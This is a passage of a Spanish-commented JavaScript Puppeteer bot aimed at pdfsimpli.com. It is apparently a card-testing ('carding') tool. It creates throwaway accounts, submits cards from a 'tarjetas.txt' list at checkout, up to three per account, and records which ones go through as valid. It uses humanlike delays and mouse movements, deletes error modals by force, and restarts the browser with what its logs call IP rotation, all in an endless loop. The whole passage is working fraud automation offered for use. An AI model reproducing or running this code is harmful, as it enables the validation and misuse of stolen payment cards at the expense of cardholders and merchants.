            if (!submit) throw new Error("Botón submit no encontrado (rápido)");

            await this.page.evaluate(
                el => el.scrollIntoView({ behavior: "instant" }),
                submit
            );
            
            await this.humanizer.delay(300, 600);
            await submit.click();

            await this.log("🚀 Pago enviado (RÁPIDO HUMANO)");
            await this.humanizer.think(1500, 2500);

            return true;

        } catch (e) {
            await this.log("⚠️ Error llenando rápido: " + e.message);
            return false;
        }
    };

    for (let i = 0; i < 3; i++) {
        const ok = await intentar(i);

        if (ok) return true;

        await this.log("🔄 Reparando formulario rápido… limpiando campos…");

        try {
            await this.page.evaluate(() => {
                const clean = (sel) => {
                    const el = document.querySelector(sel);
                    if (el) el.value = "";
                };
                clean("input[name='cardNumber']");
                clean("input#data[name='Data']");
            });
        } catch (_) { }

        await this.humanizer.think(1000, 2000);
    }

    throw new Error("❌ No se pudo llenar rápido en 3 intentos");
};

// =============================================================
// CLOSE KILLER — DETECCIÓN Y ELIMINACIÓN
// =============================================================
PDFSimpliBot.prototype.findCloseButton = async function () {
    const frames = [this.page, ...this.page.frames()];

    for (const ctx of frames) {
        try {
            const handle = await ctx.evaluateHandle(() => {
                const btn = [...document.querySelectorAll("button")]
                    .find(b => (b.innerText || "").trim().toLowerCase().includes("close"));
                return btn || null;
            });
            if (handle && handle.asElement()) return handle.asElement();
        } catch (_) {}
    }

    return null;
};

PDFSimpliBot.prototype.closeErrorModal = async function () {
    await this.log("🔎 Buscando botón Close...");

    let foundAny = false;

    for (let intento = 0; intento < 12; intento++) {
        const btn = await this.findCloseButton();

        if (!btn) {
            if (!foundAny) {
                await this.log("🟢 No hay modal de error visible");
                return false;
            } else {
                await this.log("🟢 Modal ya cerrado");
                return true;
            }
        }

        foundAny = true;
        await this.log(`🔴 Close detectado → click intento ${intento + 1}`);

        try {
            await this.page.evaluate(el => el.scrollIntoView({ behavior: "instant", block: "center" }), btn);
        } catch (_) {}

        try {
            const box = await btn.boundingBox();
            if (box) {
                await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
                await this.delay(80);
                await this.page.mouse.down();
                await this.delay(70);
                await this.page.mouse.up();
            } else {
                await this.page.evaluate(el => el.click(), btn);
            }
        } catch (_) {}

        await this.delay(1000);
    }

    await this.log("💣 FORCE MODE → Eliminando modal por DOM");

    try {
        await this.page.evaluate(() => {
            [...document.querySelectorAll("button")].forEach(b => {
                if ((b.innerText || "").toLowerCase().includes("close")) {
                    b.parentElement?.parentElement?.remove();
                }
            });
        });
    } catch (_) {}

    await this.delay(500);
    await this.log("🟢 Modal destruido (Force Mode)");
    return true;
};

// =============================================================
// VERIFICAR RESULTADO DE PAGO
// =============================================================
PDFSimpliBot.prototype.verificarResultadoPago = async function (tarjetaActual) {
    const cedulaTxt = tarjetaActual ? tarjetaActual.cedula : "N/A";

    await this.log("⏳ Esperando 10 segundos para procesar el pago...");
    await this.humanizer.think(8000, 12000);

    const startCheck = Date.now();
    const maxCheck = 15000;
    let success = false;

    while (Date.now() - startCheck < maxCheck) {
        const currentUrl = this.page.url();
        const pageSource = (await this.page.content()).toLowerCase();

        if (currentUrl.includes("pdfsimpli.com/app/billing/confirmation")) {
            success = true;
        }

        if (!success) {
            try {
                const visibleSuccess = await this.page.evaluate(() => {
                    const terms = ["payment successful", "thank you", "transaction completed"];
                    return terms.some(t =>
                        [...document.querySelectorAll("*")]
                            .some(el => (el.innerText || "").toLowerCase().includes(t))
                    );
                });
                if (visibleSuccess) success = true;
            } catch (_) {}
        }

        if (!success) {
            const terms = ["payment successful", "thank you", "transaction completed"];
            if (terms.some(t => pageSource.includes(t))) {
                success = true;
            }
        }

        if (success) break;
        await this.delay(1000);
    }

    if (success) {
        await this.log(`${COLORS_NEON.neonGreen}✅ TARJETA VÁLIDA — PAGO EXITOSO (${cedulaTxt})${COLORS_NEON.reset}`);
        if (tarjetaActual) await this.guardarCedulaValida(tarjetaActual);
        return true;
    }

    const hadClose = await this.closeErrorModal();
    if (hadClose) {
        await this.log(`${COLORS_NEON.neonPink}❌ TARJETA INVÁLIDA — MODAL CLOSE DETECTADO (${cedulaTxt})${COLORS_NEON.reset}`);
        return false;
    }

    const src = (await this.page.content()).toLowerCase();
    const errorTerms = ["declined", "error", "invalid", "failed", "rejected"];
    if (errorTerms.some(t => src.includes(t))) {
        await this.log(`${COLORS_NEON.neonPink}❌ TARJETA INVÁLIDA — MENSAJE DE ERROR DETECTADO (${cedulaTxt})${COLORS_NEON.reset}`);
        return false;
    }

    await this.log(`${COLORS_NEON.neonPink}❌ TARJETA INVÁLIDA — TIMEOUT SIN ÉXITO NI CLOSE (${cedulaTxt})${COLORS_NEON.reset}`);
    return false;
};

// =============================================================
// PROCESAR TARJETA
// =============================================================
PDFSimpliBot.prototype.procesarTarjeta = async function (tarjeta, usarRapido) {
    const { cedula, mes, anio, ruc } = tarjeta;
    const nombre = "User" + Math.random().toString(36).slice(2, 7);

    // Simular pensamiento antes de procesar
    await this.simulateHumanThinking();

    if (!usarRapido) {
        await this.fillPaymentForm(cedula, mes, anio, ruc, nombre);
    } else {
        await this.fillCardFast(cedula, ruc);
    }

    const ok = await this.verificarResultadoPago(tarjeta);

    await this.guardarTarjetaEnArchivo(tarjeta, ok);
    await this.eliminarTarjetaDelArchivo(tarjeta);

    return ok;
};

// =============================================================
// FLUJO PRINCIPAL POR CUENTA
// =============================================================
PDFSimpliBot.prototype.executeFlowCuenta = async function () {
    // 🔥 NUEVO: Mensaje personalizado antes de navegar
    console.log(
        COLORS_NEON.neonPurple +
        COLORS_NEON.bright +
`
══════════════════════════════════════════════════════════════════
🔥 LAZARO SE LEVANTÓ DE ENTRE LOS MUERTOS Y REGRESÓ A LA VIDA 🔥
══════════════════════════════════════════════════════════════════
` +
        COLORS_NEON.reset
    );
    
    await this.log("🌐 Cargando destino...");
    await this.page.goto("https://pdfsimpli.com", {
        waitUntil: "networkidle2",
        timeout: 60000
    });

    // Simular comportamiento humano al cargar
    await this.simulateHumanThinking();

    await this.uploadPDF();
    await this.clickLetsGetStarted();
    await this.clickConvert();
    await this.clickDownload();
    await this.handleRegistration();
    await this.waitAndClickContinueToPayment();

    this.cardsThisAccount = 0;

    while (this.cardsThisAccount < 3) {
        const tarjeta = this.getNextTarjeta();
        if (!tarjeta) {
            await this.log("⛔ No hay más tarjetas en tarjetas.txt");
            return false;
        }

        const usarRapido = this.cardsThisAccount > 0;
        this.cardsThisAccount++;

        await this.log(
            `💳 Probando tarjeta #${this.cardsThisAccount} (modo: ${usarRapido ? "RÁPIDO" : "COMPLETO"})`
        );

        try {
            const ok = await this.procesarTarjeta(tarjeta, usarRapido);

            if (ok) {
                await this.log("🏁 CUENTA FINALIZADA POR TARJETA VÁLIDA → CREAR NUEVA CUENTA");
                this.cuentasProcesadas++;
                return true;
            }

        } catch (e) {
            await this.log("⚠️ Error procesando tarjeta: " + e.message);
        }
    }

    await this.log("⛔ Las 3 tarjetas de esta cuenta fueron inválidas — se creará una nueva cuenta.");
    this.cuentasProcesadas++;
    return true;
};

// =============================================================
// CLOSE BROWSER
// =============================================================
PDFSimpliBot.prototype.close = async function () {
    if (this.browser) {
        await this.browser.close();
        await this.log("🔚 Navegador cerrado");
    }
};

// =============================================================
// MAIN LOOP — INFINITO + ROTACIÓN IP
// =============================================================
(async () => {
    const bot = new PDFSimpliBot();
    
    try {
        await bot.loadAllTarjetas();
        await bot.initialize();

        while (true) {
            await bot.rotacionManualSiToca();

            // Ejecutar una cuenta completa
            const seguir = await bot.executeFlowCuenta();

            // 🔥 Cerrar navegador al terminar la cuenta
            await bot.close();

            // 🔥 Abrir navegador NUEVO y limpio
            await bot.initialize();

            if (!seguir) {
                await bot.log("🚫 No hay más tarjetas — BOT FINALIZADO.");
                break;
            }
        }

    } catch (e) {
        console.error("❌ ERROR GENERAL:", e.message);
        console.error(e.stack);
    } finally {
        await bot.close();
    }
})();

// ======================================================
// FIN DEL TEMA CYBER NEON + HUMANIZER PRO
// ======================================================